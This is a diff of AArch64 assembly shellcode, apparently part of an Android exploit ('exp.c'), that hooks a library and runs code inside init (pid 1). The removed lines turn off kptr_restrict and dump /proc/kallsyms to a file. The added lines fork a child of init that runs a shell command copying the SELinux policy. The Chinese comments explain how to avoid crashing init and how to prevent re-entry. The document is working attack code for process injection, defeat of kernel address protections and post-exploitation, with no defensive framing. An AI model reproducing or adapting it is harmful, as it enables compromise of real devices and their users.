@@ -14,15 +14,13 @@ libcxx_data:
 
 mutex_file:
     .asciz "/dev/df"
-kptr_file:
-    .asciz "/proc/sys/kernel/kptr_restrict"
-zero_str:
-    .asciz "0"
-kallsyms_file:
-    .asciz "/proc/kallsyms"
-dump_file:
-    .asciz "/data/local/tmp/ks.txt"
-    .balign 4
+sh_path:
+    .asciz "/system/bin/sh"
+sh_flag:
+    .asciz "-c"
+sh_cmd:
+    .asciz "mkdir -p /data/anr && cp /sys/fs/selinux/policy /data/anr/anr_dump_policy.txt"
+    .balign 8
 
     .global libcxx_ko_target_off
 libcxx_ko_target_off:
@@ -31,7 +29,7 @@ libcxx_ko_target_off:
     .align 4
 
 libcxx_start:
-    // 现场保护
+    // 现场保护：保存所有可能被破坏的寄存器
     stp x0, x1, [sp, #-16]!
     stp x2, x3, [sp, #-16]!
     stp x4, x5, [sp, #-16]!
@@ -46,29 +44,29 @@ libcxx_start:
     svc     0
     cbnz    w0, return
 
-    // 2. 检查 tid == 1
+    // 2. 检查 tid == 1 (确保在 init 主线程)
     mov     x8, SYS_gettid
     svc     0
     cmp     w0, 1
     bne     return
 
-    // 3. 创建互斥锁 /dev/df
+    // 3. 创建互斥锁 /dev/df (防止并发重入)
     mov     x0, -100
     adr     x1, mutex_file
     movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
     mov     x3, xzr
     mov     x8, #SYS_openat
     svc     0
-
-    tbnz    w0, #31, return
+    tbnz    w0, #31, return // 如果已存在，直接返回
 
     sub     sp, sp, 16
 
-    // 4. clone 子进程
+    // 4. 准备 clone 的参数
     mov     x8, SYS_gettid
     svc     0
     str     w0, [sp, 8]
 
+    // 5. clone 子进程 (类似 fork)
     mov     x8, SYS_clone
     add     x4, sp, 8
     mov     x3, xzr
@@ -79,99 +77,50 @@ libcxx_start:
     str     w0, [sp, 8]
     add     sp, sp, 16
 
+    // 父进程 (init) 返回，恢复现场
     cbnz    w0, return          
 
 worker:
-    // 为缓冲区分配 1024 字节栈空间 (16字节对齐)
-    sub     sp, sp, 1024
-
-    // 5. 尝试修改 kptr_restrict 为 0
-    mov     x0, -100
-    adr     x1, kptr_file
-    movl    x2, (O_WRONLY|O_CLOEXEC)
-    mov     x3, xzr
-    mov     x8, #SYS_openat
-    svc     0
-    
-    tbnz    w0, #31, open_kallsyms 
-    mov     x19, x0
-    mov     x0, x19
-    adr     x1, zero_str
-    mov     x2, #1
-    mov     x8, #SYS_write
-    svc     0
-    mov     x0, x19
-    mov     x8, #SYS_close
-    svc     0
-
-open_kallsyms:
-    // 6. 打开 /proc/kallsyms
-    mov     x0, -100
-    adr     x1, kallsyms_file
-    movl    x2, (O_RDONLY|O_CLOEXEC)
-    mov     x3, xzr
-    mov     x8, #SYS_openat
-    svc     0
-    tbnz    w0, #31, cleanup_df
-    mov     x20, x0  
-
-    // 7. 打开 /data/local/tmp/ks.txt
-    mov     x0, -100
-    adr     x1, dump_file
-    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
-    movl    x3, 0644
-    mov     x8, #SYS_openat
-    svc     0
-    tbnz    w0, #31, close_kallsyms
-    mov     x21, x0  
-
-read_loop:
-    // 8. read(fd, sp, 1024)
-    mov     x0, x20
-    mov     x1, sp           // 使用 sp 作为缓冲区
-    movl    x2, 1024
-    mov     x8, #SYS_read
-    svc     0
-    
-    cmp     w0, #0
-    b.le    close_dump
-
-    // 9. write(fd, sp, w0)
-    mov     x22, x0
-    mov     x0, x21
-    mov     x1, sp
-    mov     x2, x22
-    mov     x8, #SYS_write
-    svc     0
-    
-    b       read_loop
-
-close_dump:
-    mov     x0, x21
-    mov     x8, #SYS_close
-    svc     0
-
-close_kallsyms:
-    mov     x0, x20
-    mov     x8, #SYS_close
-    svc     0
-
-cleanup_df:
-    // 恢复缓冲区栈指针！
-    add     sp, sp, 1024
-
-    // 10. 强制删除 /dev/df
+    // 6. 先在子进程中删除 /dev/df，方便下次测试
     mov     x0, -100
     adr     x1, mutex_file
     mov     x8, #SYS_unlinkat
     svc     0
 
+    // 7. 分配 64 字节栈空间用于构造 argv 数组
+    sub     sp, sp, 64
+
+    // 构造 argv: ["/system/bin/sh", "-c", "mkdir -p ... && cp ...", NULL]
+    adr     x1, sh_path
+    str     x1, [sp, 0]
+    
+    adr     x1, sh_flag
+    str     x1, [sp, 8]
+    
+    adr     x1, sh_cmd
+    str     x1, [sp, 16]
+    
+    str     xzr, [sp, 24] // NULL 结尾
+
+    // 8. execve("/system/bin/sh", argv, NULL)
+    adr     x0, sh_path
+    mov     x1, sp
+    mov     x2, xzr
+    mov     x8, #SYS_execve
+    svc     0
+
+    // 如果 execve 失败，恢复栈并退出
+    add     sp, sp, 64
+    b       myexit
+
 myexit:
+    // 子进程安全退出
     mov     x0, #0
     mov     x8, #SYS_exit
     svc     0
 
 return:
+    // 现场恢复（与开头严格对应，绝对不让 init 炸）
     ldr x30, [sp], #16
     ldp x28, x29, [sp], #16
     ldp x26, x27, [sp], #16
@@ -180,7 +129,9 @@ return:
     ldp x4, x5, [sp], #16
     ldp x2, x3, [sp], #16
     ldp x0, x1, [sp], #16
+
 libcxx_first_inst_copy:
+    // 原指令，exp.c 会把末尾的 b end 替换为 jmpback
     stp     x29, x30, [sp, #-32]!
     b       end
 end:
